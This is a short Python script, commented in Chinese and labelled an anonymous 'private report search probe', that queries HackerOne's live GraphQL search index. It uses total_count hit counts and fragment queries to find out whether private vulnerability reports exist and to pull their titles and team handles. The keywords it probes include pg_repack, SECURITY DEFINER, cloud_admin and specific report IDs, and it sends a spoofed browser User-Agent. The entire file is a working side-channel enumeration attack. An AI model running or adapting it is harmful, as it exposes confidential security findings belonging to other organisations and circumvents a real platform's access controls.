# -*- coding: utf-8 -*-
"""T1g:私有报告搜索探测 v2(2026-09-08,匿名)——total_count + fragment"""
import requests
import json
import time

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
S = requests.Session()
S.headers.update({"User-Agent": UA})
IDX = "CompleteHacktivityReportIndex"

def gql(query, label, ms=20000):
    try:
        r = S.post("https://hackerone.com/graphql", json={"query": query}, timeout=ms)
        print(f"== {label}: {r.text[:2500]}")
    except Exception as e:
        print(f"== {label} ERR {e}")

# 1. 关键词命中数(私有报告探测)
for i, q in enumerate(["pg_repack", "SECURITY DEFINER", "repack.log", "Tenant to cloud_admin", "cloud_admin superuser",
                       "h1_analyst_zenitsu", "3732660", "3992341", "15652931176"]):
    gql('{ search(index: %s, query_string: %s, first: 1){ total_count } }' % (IDX, json.dumps(q)), "kw_%d_%s" % (i, q[:14]))
    time.sleep(0.4)

# 2. 命中文档细节(用 fragment)
gql('{ search(index: %s, query_string: "pg_repack", first: 5){ total_count edges{ node{ ... on HacktivityDocument{ id public disclosed report{ id title } team{ handle } } } } } }' % IDX, "doc_repack")
time.sleep(0.4)
gql('{ search(index: %s, query_string: "hackerone", first: 2){ total_count edges{ node{ ... on HacktivityDocument{ id public disclosed report{ id title substate } team{ handle } } } } } }' % IDX, "doc_h1")
